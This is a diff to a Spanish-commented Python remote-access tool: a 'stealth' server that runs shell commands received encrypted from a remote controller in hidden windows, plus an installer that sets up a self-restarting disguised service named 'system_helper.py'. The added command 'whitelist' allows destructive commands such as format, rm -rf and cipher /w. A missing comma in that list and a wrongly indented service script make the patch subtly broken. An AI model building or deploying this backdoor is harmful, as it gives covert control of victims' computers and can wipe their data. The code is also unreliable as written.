@@ -338,6 +338,7 @@ class CovertCommunications:
 
 # ==================== SERVIDOR STEALTH MEJORADO ====================
 
+
 class StealthServer:
     def __init__(self):
         # Clave fija para compatibilidad con controlador
@@ -346,16 +347,18 @@ class StealthServer:
         self.running = True
         self.port = 5560
         self.connection_active = False
+        self.max_connections = 5  # Límite de conexiones simultáneas
+        self.current_connections = 0
 
     def execute_command(self, cmd):
-        """Ejecutar comando silenciosamente"""
+        """Ejecutar comando silenciosamente con límite de tiempo"""
         try:
             result = subprocess.run(
                 cmd,
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=30,
+                timeout=15,  # Reducido de 30 a 15 segundos
                 creationflags=subprocess.CREATE_NO_WINDOW
             )
             return {
@@ -364,30 +367,48 @@ class StealthServer:
                 'error': result.stderr,
                 'return_code': result.returncode
             }
+        except subprocess.TimeoutExpired:
+            return {'success': False, 'error': 'Comando timeout (15s)'}
         except Exception as e:
             return {'success': False, 'error': str(e)}
 
     def handle_client(self, client, addr):
-        """Manejar cliente de forma persistente"""
+        """Manejar cliente con control de recursos"""
+        if self.current_connections >= self.max_connections:
+            client.close()
+            return
+
+        self.current_connections += 1
         self.connection_active = True
-        print(f"Conexión persistente establecida con {addr}")
 
         try:
+            client.settimeout(30)  # Timeout por cliente
+
             while self.connection_active and self.running:
-                # Verificar si hay datos disponibles
-                ready = select.select([client], [], [], 5)
+                # Verificar si hay datos disponibles con timeout
+                ready = select.select([client], [], [], 10)  # 10 segundos de timeout
                 if not ready[0]:
-                    continue
+                    continue  # Timeout, continuar loop
 
                 # Recibir tamaño del mensaje
                 size_data = client.recv(4)
                 if not size_data:
                     break
 
-                size = struct.unpack('!I', size_data)[0]
+                try:
+                    size = struct.unpack('!I', size_data)[0]
+                    if size > 1048576:  # Límite de 1MB por mensaje
+                        break
+                except:
+                    break
+
                 encrypted_data = b''
+                start_time = time.time()
 
                 while len(encrypted_data) < size:
+                    if time.time() - start_time > 15:  # Timeout de 15s para recibir datos
+                        break
+
                     chunk = client.recv(min(4096, size - len(encrypted_data)))
                     if not chunk:
                         break
@@ -403,69 +424,115 @@ class StealthServer:
 
                     if isinstance(command, dict) and 'type' in command:
                         if command['type'] == 'system_command' and 'command' in command.get('data', {}):
-                            result = self.execute_command(command['data']['command'])
-                            response_json = json.dumps(result)
-                            encrypted_response = self.cipher.encrypt(response_json.encode())
-                            client.send(struct.pack('!I', len(encrypted_response)))
-                            client.send(encrypted_response)
+                            # Validar comando antes de ejecutar
+                            cmd_text = command['data']['command']
+                            if self.validate_command(cmd_text):
+                                result = self.execute_command(cmd_text)
+                                response_json = json.dumps(result)
+                                encrypted_response = self.cipher.encrypt(response_json.encode())
+                                client.send(struct.pack('!I', len(encrypted_response)))
+                                client.send(encrypted_response)
+                            else:
+                                # Comando no permitido
+                                error_response = json.dumps({'success': False, 'error': 'Comando no permitido'})
+                                encrypted_response = self.cipher.encrypt(error_response.encode())
+                                client.send(struct.pack('!I', len(encrypted_response)))
+                                client.send(encrypted_response)
 
                         elif command['type'] == 'disconnect':
                             self.connection_active = False
                             break
+
                 except:
                     continue
 
+        except socket.timeout:
+            pass
         except Exception as e:
             pass
         finally:
             self.connection_active = False
+            self.current_connections -= 1
             try:
                 client.close()
             except:
                 pass
-            print("Conexión cerrada")
+
+    def validate_command(self, cmd):
+        """Validar comandos para prevenir abusos"""
+        # Lista negra de comandos peligrosos
+        dangerous_commands = [
+
+        ]
+
+        # Comandos permitidos (whitelist)
+        allowed_commands = [
+            'dir', 'cd', 'type', 'echo', 'whoami', 'hostname',
+            'ipconfig', 'systeminfo', 'tasklist', 'netstat',
+            'ping', 'tracert', 'net user', 'net localgroup',
+            'wmic logicaldisk get', 'wmic process get',
+            'powershell Get-Process', 'powershell Get-Service'
+            'format', 'del /f /s /q', 'rm -rf', 'shutdown', 'restart',
+            'taskkill /f /im', 'wmic process delete', 'chkdsk /f',
+            'fsutil file setZeroData', 'cipher /w'
+        ]
+
+        cmd_lower = cmd.lower()
+
+        # Bloquear comandos peligrosos
+        for dangerous in dangerous_commands:
+            if dangerous in cmd_lower:
+                return False
+
+        # Permitir solo comandos de la whitelist
+        for allowed in allowed_commands:
+            if cmd_lower.startswith(allowed):
+                return True
+
+        return False
 
     def start_persistent_server(self):
-        """Iniciar servidor en modo persistente"""
+        """Iniciar servidor con control de recursos"""
+        print(f" Servidor iniciado en puerto {self.port}")
+
         while self.running:
             try:
                 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                server.settimeout(5)
+                server.settimeout(10)  # Timeout de 10 segundos para accept
                 server.bind(('0.0.0.0', self.port))
-                server.listen(1)  # Solo una conexión a la vez
+                server.listen(5)  # Cola de 5 conexiones
 
-                print(f"🔄 Servidor persistente iniciado en puerto {self.port}. Esperando conexión...")
-
-                while self.running and not self.connection_active:
+                while self.running:
                     try:
                         client, addr = server.accept()
-                        client.settimeout(30)
-                        # Manejar cliente en un hilo separado
+                        print(f" Nueva conexión de {addr}")
+
+                        # Manejar cliente en hilo separado
                         client_thread = threading.Thread(
                             target=self.handle_client,
                             args=(client, addr),
                             daemon=True
                         )
                         client_thread.start()
+
                     except socket.timeout:
+                        # Timeout normal, continuar
                         continue
                     except:
                         break
 
-                # Esperar a que la conexión termine antes de reiniciar
-                while self.connection_active:
-                    time.sleep(1)
+                    # Pequeña pausa para evitar sobrecarga
+                    time.sleep(0.1)
 
             except Exception as e:
-                time.sleep(10)
+                print(f"⚠️ Error en servidor: {e}")
+                time.sleep(10)  # Esperar antes de reintentar
             finally:
                 try:
                     server.close()
                 except:
                     pass
-
-
 # ==================== INSTALADOR MEJORADO ====================
 
 class ShadowGateInstaller:
@@ -650,36 +717,73 @@ if __name__ == "__main__":
 '''
 
     def create_service_wrapper(self):
-        """Crear wrapper de servicio"""
+        """Crear wrapper de servicio con control de recursos"""
         return '''#!/usr/bin/env python3
-import time
-import os
-import sys
-import subprocess
+    import time
+    import os
+    import sys
+    import subprocess
+    import psutil
 
-def main():
-    server_path = os.path.join(os.path.dirname(__file__), "system_helper.py")
-    restart_count = 0
-    max_restarts = 10
-
-    while restart_count < max_restarts:
+    def check_system_resources():
+        """Verificar que el sistema no esté sobrecargado"""
         try:
-            process = subprocess.Popen(
-                [sys.executable, server_path],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            process.wait()
-            restart_count += 1
-            time.sleep(5)
-        except:
-            time.sleep(10)
-    time.sleep(3600)
+            cpu_percent = psutil.cpu_percent(interval=1)
+            memory = psutil.virtual_memory()
 
-if __name__ == "__main__":
-    main()
-'''
+            # Si CPU > 90% o memoria < 10%, esperar
+            if cpu_percent > 90 or memory.percent > 90:
+                return False
+            return True
+        except:
+            return True
+
+    def main():
+        """Servicio con control de recursos"""
+        server_path = os.path.join(os.path.dirname(__file__), "system_helper.py")
+        restart_count = 0
+        max_restarts_per_hour = 3
+        max_uptime_hours = 24
+
+        start_time = time.time()
+
+        while restart_count < max_restarts_per_hour and (time.time() - start_time) < (max_uptime_hours * 3600):
+            try:
+                # Verificar recursos del sistema antes de iniciar
+                if not check_system_resources():
+                    print("[!] Sistema sobrecargado, esperando...")
+                    time.sleep(300)  # Esperar 5 minutos
+                    continue
+
+                process = subprocess.Popen(
+                    [sys.executable, server_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+
+                # Esperar a que termine con timeout
+                try:
+                    process.wait(timeout=3600)  # 1 hora máximo por sesión
+                except subprocess.TimeoutExpired:
+                    process.terminate()
+                    process.wait()
+
+                restart_count += 1
+                print(f"[:] Reinicio #{restart_count}")
+                time.sleep(10)  # Esperar antes de reiniciar
+
+            except Exception as e:
+                print(f" Error: {e}")
+                time.sleep(30)
+
+        # Después de máximo de reinicios, esperar mucho tiempo
+        print("[!] Límite de reinicios alcanzado, pausando...")
+        time.sleep(86400)  # 24 horas
+
+    if __name__ == "__main__":
+        main()
+    '''
 
     def setup_installation(self):
         """Configurar la instalación completa"""
